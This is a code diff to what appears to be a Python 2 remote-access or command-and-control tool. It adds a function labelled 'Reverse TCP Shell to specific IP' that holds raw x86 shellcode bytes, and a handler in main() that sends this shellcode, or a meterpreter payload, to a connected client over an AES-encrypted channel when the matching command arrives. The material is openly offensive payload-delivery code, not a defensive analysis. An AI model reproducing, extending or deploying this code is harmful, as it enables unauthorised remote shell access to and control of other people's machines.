@@ -93,7 +93,7 @@ def meterpreter() :
     return shellcode
 
 #Reverse TCP Shell to specific IP
-def meterpreter() :
+def shell() :
     shellcode =  "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"+\
                  "\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"+\
                  "\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"+\
@@ -243,6 +243,14 @@ def main():
                         cmd = 'ok'
                     if code == "1" and cmd == "meterpreter":
                         cmd = meterpreter()
+                        code = "0"
+                        req_str = option(con, aes, cmd)
+                        print >>sys.stderr, ''
+                        print >>sys.stderr, '%s' % req_str
+                        print >>sys.stderr, ''
+                        break
+                    if code == "1" and cmd == "shell":
+                        cmd = shell()
                         code = "0"
                         req_str = option(con, aes, cmd)
                         print >>sys.stderr, ''
